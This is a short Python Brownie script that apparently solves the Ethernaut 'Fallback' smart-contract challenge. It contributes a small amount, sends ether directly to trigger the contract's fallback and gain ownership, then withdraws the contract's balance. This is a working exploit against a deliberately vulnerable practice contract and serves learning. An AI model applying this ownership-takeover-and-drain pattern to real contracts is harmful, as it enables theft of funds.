from brownie import Fallback, network, Contract, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        fallback = Fallback.deploy({"from": get_account(index=1)})

    else:

        web3 = Web3(
            config["networks"][network.show_active()]["infura"]
        )

        fallback = Contract.from_abi(
            Fallback._name,
            config["networks"][network.show_active()]["fallback"],
            Fallback.abi,
        )

    fallback.contribute({"from": account, "value": Web3.toWei("0.0001", "ether")}).wait(
        1
    )
    account.transfer(fallback, "0.0001 ether")
    fallback.withdraw({"from": account}).wait(1)
    print(f"Fallback balance in {fallback.balance()}")


def main():
    attack()
